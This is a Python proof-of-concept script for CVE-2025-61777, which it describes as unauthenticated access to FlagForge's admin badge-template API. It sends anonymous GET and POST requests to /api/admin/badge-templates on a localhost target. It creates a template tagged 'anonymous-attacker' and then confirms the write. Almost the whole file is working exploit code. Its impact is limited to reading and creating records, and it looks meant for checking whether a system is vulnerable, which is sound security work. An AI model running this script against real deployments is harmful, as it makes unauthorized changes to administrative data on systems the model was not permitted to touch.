#!/usr/bin/env python3
import requests
import json
import sys

TARGET_URL = "http://localhost:3000"

def test_get_badge_templates():
    """Test unauthenticated access to GET /api/admin/badge-templates"""
    url = f"{TARGET_URL}/api/admin/badge-templates"
    print(f"[*] Testing GET {url}")
    
    resp = requests.get(url, timeout=10)
    print(f"[*] Status Code: {resp.status_code}")
    
    if resp.status_code == 200:
        data = resp.json()
        if data.get("success"):
            print("[+] VULNERABLE: Unauthenticated access to badge templates allowed")
            print(f"[+] Response: {json.dumps(data, indent=2)}")
            return True
    
    print("[-] Not vulnerable or endpoint not accessible")
    return False

def test_create_badge_template():
    """Test unauthenticated access to POST /api/admin/badge-templates"""
    url = f"{TARGET_URL}/api/admin/badge-templates"
    print(f"\n[*] Testing POST {url}")
    
    payload = {
        "name": "CVE-2025-61777-Test-Badge",
        "description": "Test badge created via unauthenticated API access",
        "icon": "/badges/custom/test.png",
        "color": "#FF0000",
        "isActive": True,
        "createdBy": "anonymous-attacker"
    }
    
    resp = requests.post(url, json=payload, timeout=10)
    print(f"[*] Status Code: {resp.status_code}")
    
    if resp.status_code == 200:
        data = resp.json()
        if data.get("success"):
            print("[+] VULNERABLE: Unauthenticated badge template creation allowed")
            print(f"[+] Created template: {json.dumps(data, indent=2)}")
            return True
    
    print("[-] Not vulnerable or endpoint not accessible")
    return False

def test_verify_created_template():
    """Verify the created badge template is visible"""
    url = f"{TARGET_URL}/api/admin/badge-templates"
    print(f"\n[*] Verifying created template via GET {url}")
    
    resp = requests.get(url, timeout=10)
    if resp.status_code == 200:
        data = resp.json()
        templates = data.get("templates", [])
        for t in templates:
            if t.get("name") == "CVE-2025-61777-Test-Badge":
                print("[+] CONFIRMED: Test badge template found in database")
                print(f"[+] Template details:")
                print(f"    - Name: {t.get('name')}")
                print(f"    - Description: {t.get('description')}")
                print(f"    - CreatedBy: {t.get('createdBy')}")
                print(f"    - CreatedAt: {t.get('createdAt')}")
                return True
    
    print("[-] Could not verify created template")
    return False

def main():
    print("=" * 60)
    print("CVE-2025-61777 PoC - FlagForge Unauthenticated Badge API Access")
    print("=" * 60)
    print(f"[*] Target: {TARGET_URL}")
    print()
    
    vuln_count = 0
    
    if test_get_badge_templates():
        vuln_count += 1
    
    if test_create_badge_template():
        vuln_count += 1
    
    if test_verify_created_template():
        vuln_count += 1
    
    print("\n" + "=" * 60)
    if vuln_count >= 2:
        print("[+] RESULT: Target is VULNERABLE to CVE-2025-61777")
        print("[+] Unauthenticated access to admin badge template API confirmed")
        sys.exit(0)
    else:
        print("[-] RESULT: Target does not appear to be vulnerable")
        sys.exit(1)

if __name__ == "__main__":
    main()
